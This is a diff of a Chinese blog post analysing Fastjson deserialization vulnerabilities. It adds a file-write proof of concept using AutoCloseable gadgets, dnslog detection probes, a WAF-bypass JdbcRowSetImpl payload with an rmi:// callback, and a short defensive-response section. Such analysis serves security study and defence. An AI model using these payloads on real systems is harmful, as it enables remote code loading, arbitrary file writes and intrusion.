+<p>checkautotype一般有以下几种情况通过验证</p>
 <pre><code>1.白名单里的类
 2.开启了 autotype
 3.使用了 JSONType 注解
 4.指定了期望类（expectClass）
-5.缓存 mapping 中的类
+5.缓存 mapping 中的类（1.2.47使用的方法）
 </code></pre>
-<h2 id="0x11-dnslog判断后端是否使用fastjson"><a href="#0x11-dnslog判断后端是否使用fastjson" class="headerlink" title="0x11 dnslog判断后端是否使用fastjson"></a>0x11 dnslog判断后端是否使用fastjson</h2><p>1.2.48之前版本</p>
+<p>如果某个类继承了期望类，是可以通过checkautotype验证，然后被反序列化的。</p>
+<p>思路就是找到继承了<code>java.lang.AutoCloseable</code>，<code>java.lang.Exception</code>类的gadget。</p>
+<p>直接上POC，这里我就不进行分析了。</p>
+<p>Maven：</p>
+<pre><code>&lt;!--  复制/写文件 --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.aspectj&lt;/groupId&gt;
+    &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;
+    &lt;version&gt;1.9.5&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;!--  写内容 --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;
+    &lt;artifactId&gt;kryo&lt;/artifactId&gt;
+    &lt;version&gt;4.0.0&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;!--  触发flush --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;
+    &lt;artifactId&gt;je&lt;/artifactId&gt;
+    &lt;version&gt;5.0.73&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>POC：</p>
+<pre><code>&#123;
+    &quot;stream&quot;: &#123;
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,
+        &quot;targetPath&quot;: &quot;f:/test/pwn.txt&quot;,
+        &quot;tempPath&quot;: &quot;f:/test/test.txt&quot;
+    &#125;,
+    &quot;writer&quot;: &#123;
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,
+        &quot;buffer&quot;: &quot;YjF1M3I=&quot;,
+        &quot;outputStream&quot;: &#123;
+            &quot;$ref&quot;: &quot;$.stream&quot;
+        &#125;,
+        &quot;position&quot;: 5
+    &#125;,
+    &quot;close&quot;: &#123;
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,
+        &quot;out&quot;: &#123;
+            &quot;$ref&quot;: &quot;$.writer&quot;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h2 id="0x11-dnslog判断是否存在fastjson-反序列化漏洞"><a href="#0x11-dnslog判断是否存在fastjson-反序列化漏洞" class="headerlink" title="0x11 dnslog判断是否存在fastjson 反序列化漏洞"></a>0x11 dnslog判断是否存在fastjson 反序列化漏洞</h2><p>1.2.48之前版本</p>
 <pre><code>&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;
 </code></pre>
 <p>最新版本1.2.67</p>
 <pre><code>&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;
 &#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;
 </code></pre>
-<p>畸形的</p>
+<p>其他的</p>
 <pre><code>&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;
+&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;
+&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;
+&#123;&#123;"@type":"java.net.URL","val":"dnslog"&#125;:"aaa"&#125;
+Set[&#123;"@type":"java.net.URL","val":"dnslog"&#125;]
+Set[&#123;"@type":"java.net.URL","val":"dnslog"&#125;
+&#123;&#123;"@type":"java.net.URL","val":"dnslog"&#125;:0
+```
+
+绕过waf的pyload：
+
+```
+&#123;"@type":\b"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:9999","autoCommit":true&#125;&#125;
 </code></pre>
 <p>其他依赖包的pyload：</p>
 <p>JtaTransactionConfig<br>fastjson&lt;=1.2.66<br>autoTypeSupport属性为true才能使⽤。（fastjson&gt;=1.2.25默认为false）</p>
@@ -1287,7 +1463,8 @@ public class poc &#123;
 &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
 &#125;
 </code></pre>
-<h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h2><ol>
+<h2 id="0x12-防御应急"><a href="#0x12-防御应急" class="headerlink" title="0x12 防御应急"></a>0x12 防御应急</h2><p>如果企业中爆发了类似fastjson的这样安全事件可以先全局搜索pom.xml搜索到利用fastjson的地方，然后写Poc进行全量的漏扫，然后推送开发进行对应性的修复，同时可在waf中添加<code>&quot;@type&quot;</code> 进行拦截。</p>
+<h2 id="0x13-简单总结"><a href="#0x13-简单总结" class="headerlink" title="0x13 简单总结"></a>0x13 简单总结</h2><ol>
 <li>fastjson漏洞版本很多，首先是从最开始的1.2.22-1.2.24因@type引发的反序列化漏洞。</li>
 <li>到 了1.2.25版本意识到危害后把@type改为默认关闭，还添加了黑白名单进行校验开启autotype传入的@type。</li>
 <li>在1.2.48版本之前中途出的发布的各种版本都是由于之前的漏洞修复很草率而出的，期间还有了1.2.25-1.2.47通杀payload。<ol>
@@ -1296,12 +1473,14 @@ public class poc &#123;
 </ol>
 </li>
 </ol>
-<p>参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/#fastjson-lt-1-2-66">https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/#fastjson-lt-1-2-66</a></p>
+<p>​            4.常用的 JNDI RCE 类基本上都继承自 ClassLoader、DataSource、RowSet 接口，比如JdbcRowSetImpl、JndiDataSourceFactory、OracleJDBCRowSet。</p>
+<h2 id="0x14-参考链接："><a href="#0x14-参考链接：" class="headerlink" title="0x14 参考链接："></a>0x14 参考链接：</h2><p><a target="_blank" rel="noopener" href="https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/#fastjson-lt-1-2-66">https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/#fastjson-lt-1-2-66</a></p>
 <p><a target="_blank" rel="noopener" href="https://paper.seebug.org/942/#classreference-factory">https://paper.seebug.org/942/#classreference-factory</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9052#toc-14">https://xz.aliyun.com/t/9052#toc-14</a></p>
 <p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1319/#0x01-checkautotype">https://paper.seebug.org/1319/#0x01-checkautotype</a></p>
 <p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1343/#fastjson-1247">https://paper.seebug.org/1343/#fastjson-1247</a></p>
+<p><a target="_blank" rel="noopener" href="https://novysodope.github.io/2021/03/11/57/#0x01-Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B%E8%B7%9F%E8%BF%9B">https://novysodope.github.io/2021/03/11/57/#0x01-Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B%E8%B7%9F%E8%BF%9B</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7568%EF%BC%88%E7%BB%95%E8%BF%87waf%EF%BC%89">https://xz.aliyun.com/t/7568（绕过waf）</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2017441810@qq.com </span>
@@ -1316,10 +1495,10 @@ public class poc &#123;
 
 <div class="article_copyright">
     <p><span class="copy-title">Title:</span>Java反序列化-Fastjson漏洞全分析</p>
-    <p><span class="copy-title">Count:</span><span class="post-count">5.8k</span></p>
+    <p><span class="copy-title">Count:</span><span class="post-count">7.5k</span></p>
     <p><span class="copy-title">Author:</span><a  title="juneRain">juneRain</a></p>
     <p><span class="copy-title">Created At:</span>2021-12-18, 18:00:12</p>
-    <p><span class="copy-title">Updated At:</span>2021-12-24, 15:20:18</p>
+    <p><span class="copy-title">Updated At:</span>2022-01-11, 18:45:24</p>
     <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%88%86%E6%9E%90/" title="Java反序列化-Fastjson漏洞全分析">http://example.com/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%88%86%E6%9E%90/</a>
     <p>
         <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
